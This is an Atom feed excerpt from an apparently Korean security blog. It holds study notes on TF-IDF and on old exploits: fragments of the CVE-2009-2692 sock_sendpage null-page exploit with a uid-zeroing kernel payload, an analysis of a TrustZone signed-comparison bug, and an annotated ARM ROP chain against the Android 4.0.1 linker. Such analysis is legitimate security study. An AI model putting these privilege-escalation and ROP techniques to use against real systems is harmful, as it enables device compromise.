<li>TF (Term Frequency) * IDF (Inverse Document Frequency) = TF-IDF</li>
</ol>


<p>그렇다면, AdWords 같은 광고 스킴을 디자인한다고 가정하고. 광고주는 Nike 를 가정하자. 그리고 marathon, race, trophy 가 키워드인 웹페이지가 두 개있다고 가정하는데, 하나는 운동에 관한 페이지고 하나는 선거(election)에 관한 페이지다. 물론 Nike 는 운동에 관한 페이지에 자사 광고를 노출시키고 싶어한다. 맥락을 구별할 필요가 있는 것인데, 이런 경우 TF-IDF 를 이용할 수 있을까?</p>

<p>이용할 수 있다. 두 개의 단어가 같이 출현하는 빈도를 생각해본다. 예를 들어, <code>marathon</code> 과 <code>42 kilometres</code> 또는 <code>26 miles</code> 는 실제 러닝을 다루는 웹페이지들에서 같이 출현했을 것이다. 또한 <code>election</code>, <code>voter</code>, <code>ballot</code> 은 선거를 다루는 글에서 같이 출현했을 것이다.</p>

<p>다음의 계산을 거치면, 모든 pairs of words 에 대한 correlation 이 계산된다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for every page in all web pages on the Internet:
</span><span class='line'>    for every pair of words in the page:
</span><span class='line'>        correlation[word_A,word_B] += tf-idf(word_A) * tf-idf(word_B)</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>즉 <code>marathon</code> 과 <code>42 kilometres</code> 의 인터넷 전체에서의 correlation 값이 나오는 것이다. 이런 무지막지한 계산을 하려니 Hadoop 과 MapReduce 같은 녀석들이 필요했었고, 또 만들었겠지.</p>

<p>위처럼 word-word correlation 을 이용해 semantic 을 분석하는 기법이 Latent Semantic Analysis 의 기본 아이디어라고 한다. LSA-based algorithm 을 이용하여 Topic Analysis 를 할 수가 있는데, 그 예를 들어본다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Android Hacker's Handbook]]></title>
    <link href="http://zomo.heroku.com/blog/2016/01/13/android-hackers-handbook/"/>
    <updated>2016-01-13T11:11:01+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/01/13/android-hackers-handbook</id>
    <content type="html"><![CDATA[<p>유명한 아저씨들의 Android Hacker&rsquo;s Handbook 중에서 챕터 8 을 정리해본다.</p>

<p>흠.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2013-2094: Perf_swevent_enabled Revisited]]></title>
    <link href="http://zomo.heroku.com/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited/"/>
    <updated>2016-01-11T15:55:36+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited</id>
    <content type="html"><![CDATA[<p>몇 달전에 increment primitive 를 만들어서 특정 byte 를 0 으로 만드는 기법으로 IDT 를 고쳐서, RING 0 수행을 만든 exploit 을 정리했었는데, 이번에는 Brad Spengler 의 exploit 을 분석해본다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour]]></title>
    <link href="http://zomo.heroku.com/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/"/>
    <updated>2016-01-11T15:39:41+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour</id>
    <content type="html"><![CDATA[<p>BSides Vienna 2015 에 발표된 <a href="https://github.com/maldevel/BSides_Vienna_2015/blob/master/exploit_workshop.pdf">Writing your first windows exploit in less than one hour</a> 를 정리해본다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sock_sendpage]]></title>
    <link href="http://zomo.heroku.com/blog/2016/01/11/sock-sendpage/"/>
    <updated>2016-01-11T14:42:27+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/01/11/sock-sendpage</id>
    <content type="html"><![CDATA[<p>CVE-2009-2692, sock_sendpage 에서 벌어지는 NULL pointer deref 버그를 정리한다. 발견자가 Tarvis Ormandy 인지 Brad Spengler 인지는 이런저런 문서를 읽어봐도 잘 모르겠다.</p>

<p>Exploit 자체는 꽤 클래식해서 정리해놓을 가치가 있다고 생각한다.</p>

<p><a href="http://http://downloads.securityfocus.com/vulnerabilities/exploits/36038-5.c">exploit.c</a></p>

<h4>Exploit</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>if ((zero_page = mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0)) == MAP_FAILED) {
</span><span class='line'>  ...
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>0x0 에 4096 bytes 짜리 메모리 페이지를 할당한다.</p>

<p>그리고, payload 를 담고있는 변수의 주소를 0x00000002,0x3,0x4,0x5 에 깐다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*(char *)0x00000000 = 0xff;
</span><span class='line'>*(char *)0x00000001 = 0x25;
</span><span class='line'>*(unsigned long *)0x00000002 = (unsigned long)&kernel;
</span><span class='line'>*(char *)0x00000006 = 0xc3;</span></code></pre></td></tr></table></div></figure>


<p>버그가 trigger 되면 <code>fp = *(unsigned long)(*(unsigned long)((0x00000000)-&gt;0x2)); (*fp)();</code> 하는 모양.</p>

<p>Kernel priv. 로 돌아가는 페이로드는 다음과 같다. cred structure 에서 uid 들을 고치는 페이로드.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>while (pcb_task_struct) {
</span><span class='line'>  if (pcb_task_struct[0] == uid && pcb_task_struct[1] == uid &&
</span><span class='line'>      pcb_task_struct[2] == uid & pcb_task_struct[3] == uid &&
</span><span class='line'>      ...) {
</span><span class='line'>      pcb_task_struct[0] = [1] = ... = [7] = 0;
</span><span class='line'>      break;
</span><span class='line'>  }   
</span><span class='line'>  pcb_task_struct++;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>그런데 왜 NULL porinter 를 deref 하게 되는지는 너무 오래된 버그라서 큰 의미는 없을 것 같다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On the Juniper Backdoor]]></title>
    <link href="http://zomo.heroku.com/blog/2015/12/23/on-the-juniper-backdoor/"/>
    <updated>2015-12-23T16:09:25+09:00</updated>
    <id>http://zomo.heroku.com/blog/2015/12/23/on-the-juniper-backdoor</id>
    <content type="html"><![CDATA[<p>Matthew Green 블로그에 올라온 Juniper 장비 백도어에 대해 정리해본다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[TRUSTNONE]]></title>
    <link href="http://zomo.heroku.com/blog/2015/12/07/trustnone/"/>
    <updated>2015-12-07T17:14:52+09:00</updated>
    <id>http://zomo.heroku.com/blog/2015/12/07/trustnone</id>
    <content type="html"><![CDATA[<p>Sean Beaupre 씨가 쓴 글, <a href="http://theroot.ninja/disclosures/TRUSTNONE_1.0-11282015.pdf">TRUSTNONE</a> 을 읽고 정리해본다.</p>

<p>스냅드래곤 805 트러스트존 커널의 메모리/레지스터를 읽고 쓸 수 있다.</p>

<h4>백그라운드</h4>

<p><code>tzbsp_smmu_fault_regs_dump</code> 라는 시스템콜에 버그가 있어서.</p>

<ol>
<li>4 개의 인자를 기대하는데.</li>
<li><code>R4-R8</code> 과 링크 레지스터를 스택에 저장하고</li>
<li><code>R0</code>,<code>R1</code>,<code>R2</code>,<code>R3</code> 에 담긴 arg0, arg1, arg2, arg3 를 <code>R5-R8</code> 에 옮기고. 이때 <code>adds</code> 로 <code>R2</code> 가 0 인지 아닌지를 체크하고</li>
<li><code>BEQ</code> 로 <code>R2 != 0</code> 이면 <code>is_debugging_disabled</code> 체크하는 루틴으로 뛰고</li>
<li><code>CBZ</code> 로, <code>is_debugging_disabled</code> 가 1 이면 <code>loc_FE85881E</code> 로 뛰고</li>
<li><code>do_regs_dump</code> 를 호출하는데.</li>
<li><code>do_regs_dump</code> 에서 <code>validate_input</code> 을 부른다</li>
<li><code>validate_input</code> 에서 <code>do_sloppy_signed_comparison</code> 을 부르는데</li>
<li><code>do_sloppy_signed_comparison</code> 은 <code>CMP R0, #7</code> <code>BGE loc_FE863164</code> 로 흘러간다</li>
<li>BGE 일 경우, #0 을 돌려주고, 아니면 1 을 돌려준다</li>
<li>그런데 THUMB BGE 명령어는 signed comparison 이다</li>
<li>R0 가 0~6 이면 당연히 #1 을 돌려주지만, minus 일경우에도 #1 을 돌려준다</li>
<li>minus 값으로 체크를 통과하는 듯</li>
<li>validate_something_else 가 불리는데</li>
</ol>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>R0 = arg0;
</span><span class='line'>R1 = arg1;
</span><span class='line'>R0 = R0 * 0x11;
</span><span class='line'>uint *R2 = (uint *)0xFE8282CC; /* this is in a data segment in TrustZone kernel */
</span><span class='line'>R2 = *R2; /* in the TrustZone image I'm testing with, this value = 0xFE827B58 */
</span><span class='line'>R0 = 4 + (R0 * 0x10);
</span><span class='line'>R0 = *(R0 + R2);
</span><span class='line'>if (R0 &lt; R1) return 0; /* fail - we need to return 1, thus R0 needs to be &gt; R1 */</span></code></pre></td></tr></table></div></figure>


<p><code>do_sloppy_signed_comparison</code> 에서 <code>R0</code> 가 0~6 사이의 값일 것을 검사했지만, 사실 0x80000000 ~ 0xFFFFFFFF 사이의 음수라도 검사를 통과할 수 있었다. R0 가 음수일 경우를 가정해보자. 예를 들어, 0x88888888 이라면?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>R0 = arg0 = 0x88888888;
</span><span class='line'>R1 = arg1;
</span><span class='line'>R0 = R0 * 0x11; /* 0x11111108 */
</span><span class='line'>R2 = 0xFE8282CC;
</span><span class='line'>R2 = *(uint *)R2; /* 0xFE827B58 */
</span><span class='line'>R0 = 4 + (R0 * 0x10); /* 0x11111084 */
</span><span class='line'>R0 = *(R0 + R2); /* R0 now is loaded with the data contained at physical address 0x11111084 + 0xFE827B58 = 0x0F938BDC /* &lt;&lt; This memory location is NOT secure, we can control it! */ 
</span><span class='line'>if (R0 &lt; R1) return 0;</span></code></pre></td></tr></table></div></figure>


<p>validate_input 에서 돌아오면, 비슷한 계산을 또 하는데.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Return Oriented Programming for the ARM Architecture]]></title>
    <link href="http://zomo.heroku.com/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/"/>
    <updated>2015-10-04T16:30:36+09:00</updated>
    <id>http://zomo.heroku.com/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture</id>
    <content type="html"><![CDATA[<p>Tim Kornau 의 논문, <a href="">Return Oriented Programming for the ARM Architecture</a> 를 읽고 정리해본다.</p>

<h4>Contents</h4>

<ul>
<li></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Inside Story Behind MS08-067]]></title>
    <link href="http://zomo.heroku.com/blog/2015/10/02/the-inside-story-behind-ms08-067/"/>
    <updated>2015-10-02T13:34:09+09:00</updated>
    <id>http://zomo.heroku.com/blog/2015/10/02/the-inside-story-behind-ms08-067</id>
    <content type="html"><![CDATA[<p><a href="http://blogs.technet.com/b/johnla/archive/2015/09/26/the-inside-story-behind-ms08-067.aspx">The Inside Story Behind MS08-067</a> 을 읽고 정리해본다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP and ARM]]></title>
    <link href="http://zomo.heroku.com/blog/2015/09/17/rop-and-arm/"/>
    <updated>2015-09-17T17:38:41+09:00</updated>
    <id>http://zomo.heroku.com/blog/2015/09/17/rop-and-arm</id>
    <content type="html"><![CDATA[<p>ARM 에서 메모리에다가 인스트럭션을 쓰고, 바로 control flow 를 그리로 돌리면, cache 때문에 공격자의 payload 가 실행되지 않는 케이스가 몇가지 있다. ARM 에서 첫단계는 ROP 로 구성해야하는 이유. Instruction cache flushing 을 하는 system call 이 있기는 한데, i.e. Linux 는 <code>cacheflush()</code>, 저걸 부르기 위해서는 먼저 code 수행을 만들어야하니 닭과 달걀의 문제가 되버린다고. 다행히 <code>mprotect()</code> 를 부르면 cache 가 flushing 되니, ROP 에서 mprotect() 로 payload 를 executable 하게 마크해주면 일거양득.</p>

<h4>Basics of ROP on ARM</h4>

<p>ARM ABI 에 따르면, subroutine 의 return address 는 link register 인 <code>lr</code> 에 저장된다. <code>bl</code> 이나 <code>blx</code> 는 다음에 실행할 인스트럭션의 주소를 <code>lr</code> 에 넣고는 subroutine 으로 뛴다. subroutine 에서는 <code>bx lr</code> 로 돌아온다.</p>

<p>Return address 를 stack 에 쌓는 것은 별도로 코딩해줘야 하는데,</p>

<p><code>stmia sp!, {r4, lr} # store link register and callee-saved r4 on stack</code></p>

<p><code>bl subroutine # call subroutine, trashing link register</code></p>

<p><code>ldmia sp!, {r4, lr} # load original link register and r4 from stack</code></p>

<p><code>bx lr # return to calling code</code></p>

<p>가 되고, thumb 모드에서는</p>

<p><code>push {lr} # store link register on stack</code></p>

<p><code>bl subroutine # call subroutine, trashing link register</code></p>

<p><code>pop {pc} # load original link register and return to calling code</code></p>

<p>가 된다.</p>

<h4>Combining Gadgets into a Chain</h4>

<ul>
<li>ARM gadget 은 <code>ldmia sp!, {..., lr}; bx lr</code> 로 끝나는 명령어들</li>
<li>Thumb gadget 은 <code>pop {..., pc}</code> 로 끝나는 명령어들</li>
</ul>


<p>Stack 을 overwrite 할 수 있다고 가정하면, <code>pop {r0-r4, pc}</code> gadget 을 찾아서, 그 어드레스를 스택에 넣고, argument <code>r0-r4</code> 도 넣어준다. 함수가 return 할 때, <code>pop {pc}</code> 로 원래 돌아가야할 곳이 아닌, <code>pop {r0-r4, pc}</code> gadget 으로 튀고, 여기서 다시 새로운 gadget 주소로 튀고, 튀고 튀고&hellip;</p>

<p>이제 <code>lr</code> 조정을 해주는 chain 을 보면&hellip; 스택에 <code>lr</code> 값까지 overwrite 하고, <code>pop {r0, lr}; bx lr</code> 로 <code>lr</code> 세팅을하고 <code>lr</code> 이 가리키는 주소로 튀고, 거기서 <code>pop {pc}</code> gadget 으로 다시 튀고. 이제 <code>lr</code> 은 <code>pop {pc}</code> 를 가리키고 있으니, <code>bx lr</code> 을 만나도 ROP 체인이 끊기지 않는다.</p>

<h4>Case Study: Android 4.0.1 Linker</h4>

<p>Android 4.0 대에서는 rild 의 dynamic linker 부분이 항상 0xb0001000 에 위치한다는 것. 4.1 부터는 이것마저도 ASLR 이 적용되었지만.</p>

<p>ROP chain 이 하는 일은 1 page 를 alloc 해서 (4096 byts), executable 하게 만들고, 공격자의 payload 를 카피해서 글루 튀는 것.</p>

<p>Stack pivot 부터 시작해야하는데, stack pivot 은 sp 를 내가 내용을 컨트롤하는 메모리를 가리키게해놓는것.</p>

<p><code>mmap()</code> 으로  메모리를 할당하는데, <code>0xb1008000</code> 에 할당하도록 한다고.</p>

<p>다음은 mmap() 으로 executable 한 메모리를 <code>0xb1008000</code> 에 할당하는 ROP 체인.</p>

<p>Stack pivot 할 때, <code>lr = 0xb006545</code> 로 맞춰줘야한다. 0xb0006544 에 있는 gadget 은 <code>pop {r4,r5,pc}</code>. 이 gadget 이 mmap() 의 5,6 번째 파라메터를 팝팝하고 다시 다음 체인으로 튀게 해준다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0xb00038ca  # pop {r0-r4,pc} gadget 이 있는 주소
</span><span class='line'>0xb0018000  # r0: static allocation target address
</span><span class='line'>0x00001000  # r1: size to allocate = one page, 1 page 만큼 메모리를 할당
</span><span class='line'>0x00000007  # r2: protection = read, write, execute
</span><span class='line'>0x00000032  # r3: flags = MAP_ANON | MAP_PRIVATE | MAP_FIXED
</span><span class='line'>0xdeadbeef  # r4: don't care
</span><span class='line'>0xb0001678  # pc: __dl_mmap, returning to lr = 0xb006545 (mmap 이 subroutine 을 호출해서, lr 이 mmap() 함수 안에 어딘가를 가리키게 된다)
</span><span class='line'>0xffffffff  # 5 번째 파라메터는 stack 에. fd = -1
</span><span class='line'>0x00000000  # 6 번째 파라메터도 stack 에. offset = 0
</span><span class='line'>0xdeadc0de  # next gadget 의 주소. (mmap 이 pop {pc} 를 해준다면)</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
